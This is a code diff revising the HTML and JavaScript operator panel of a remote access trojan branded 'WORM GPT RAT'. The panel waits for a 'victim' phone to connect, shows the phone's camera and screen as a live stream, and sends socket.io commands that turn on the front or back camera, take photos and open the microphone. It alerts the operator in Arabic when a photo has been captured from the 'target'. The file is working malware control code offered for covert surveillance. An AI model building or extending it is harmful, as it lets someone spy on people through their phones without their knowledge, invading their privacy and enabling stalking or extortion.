@@ -1,58 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WORM GPT - ADVANCED PANEL</title>
+    <title>WORM GPT - PRO PANEL</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { background: #0a0a0a; color: #ff0000; font-family: sans-serif; text-align: center; }
-        .box { border: 2px solid #ff0000; padding: 20px; margin: 10px; display: inline-block; background: #1a1a1a; }
-        button { background: #ff0000; color: white; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin: 5px; }
-        button:hover { background: #aa0000; }
-        #liveView { width: 80%; max-width: 600px; border: 5px solid #333; margin-top: 20px; }
-        .status { color: #00ff00; font-size: 1.2em; }
+        body { background: #050505; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; margin: 0; }
+        .header { background: #111; padding: 15px; border-bottom: 2px solid #ff0000; box-shadow: 0 0 15px #f00; }
+        .monitor-container { width: 90%; max-width: 900px; margin: 20px auto; background: #000; border: 2px solid #333; position: relative; min-height: 500px; }
+        #liveView { width: 100%; height: auto; display: block; }
+        .controls { background: #111; padding: 20px; border-top: 2px solid #ff0000; position: fixed; bottom: 0; width: 100%; }
+        button { background: #ff0000; color: #fff; border: none; padding: 12px 20px; margin: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; border-radius: 5px; }
+        button:hover { background: #fff; color: #f00; box-shadow: 0 0 10px #fff; }
+        .status-bar { color: #0f0; margin: 10px; font-size: 1.1em; }
     </style>
 </head>
 <body>
-    <h1>WORM GPT RAT - CONTROL CENTER</h1>
-    <p>Status: <span id="stat" class="status">Waiting for Victim...</span></p>
-
-    <div class="box">
-        <h3>LIVE MONITOR</h3>
-        <img id="liveView" src="" alt="Waiting for stream data...">
+    <div class="header">
+        <h2>WORM GPT REMOTE CONTROL (v3.0)</h2>
+        <div id="target" class="status-bar">Target: Waiting for Connection...</div>
     </div>
 
-    <br>
+    <div class="monitor-container">
+        <img id="liveView" src="" alt="[ STREAM OFFLINE ]">
+    </div>
 
-    <div class="box">
-        <h3>REMOTE ACTIONS</h3>
-        <button onclick="sendCommand('start_camera')">بث كاميرا مباشر 📸</button>
-        <button onclick="sendCommand('start_screen')">مشاهدة الشاشة مباشر 📱</button>
-        <button onclick="sendCommand('take_photo')">التقاط صورة سريعة 🖼️</button>
-        <button onclick="sendCommand('start_audio')">فتح الميكروفون 🎙️</button>
-        <button onclick="stopAll()">إيقاف كل العمليات 🛑</button>
+    <div class="controls">
+        <button onclick="send('start_camera_back')">الكاميرا الخلفية 📸</button>
+        <button onclick="send('start_camera_front')">الكاميرا الأمامية 🤳</button>
+        <button onclick="send('take_photo')">التقاط صورة 🖼️</button>
+        <button onclick="send('start_audio')">الميكروفون 🎙️</button>
+        <button onclick="location.reload()">إيقاف / تحديث 🛑</button>
     </div>
 
     <script>
         const socket = io();
+        const view = document.getElementById('liveView');
 
-        // استقبال التبليغ
-        socket.on('new_victim_alert', (data) => {
-            document.getElementById('stat').innerText = "Connected to: " + data.model;
+        socket.on('new_victim_alert', d => {
+            document.getElementById('target').innerText = "Target Online: " + d.model;
         });
 
-        // استقبال فريمات الفيديو (كاميرا أو شاشة) وعرضها
-        socket.on('display_frame', (data) => {
-            document.getElementById('liveView').src = "data:image/jpeg;base64," + data.frame;
+        // استقبال الفيديو السلس
+        socket.on('display_frame', d => {
+            view.src = "data:image/jpeg;base64," + d.frame;
         });
 
-        // إرسال الأوامر للهاتف
-        function sendCommand(cmd) {
+        // استقبال الصور الملتقطة
+        socket.on('display_photo', d => {
+            view.src = "data:image/jpeg;base64," + d.img;
+            alert("تم التقاط صورة من الهدف!");
+        });
+
+        function send(cmd) {
             socket.emit('admin_command', { command: cmd });
-            console.log("Sent command: " + cmd);
-        }
-
-        function stopAll() {
-            location.reload(); // لإيقاف الاستقبال من المتصفح
         }
     </script>
 </body>
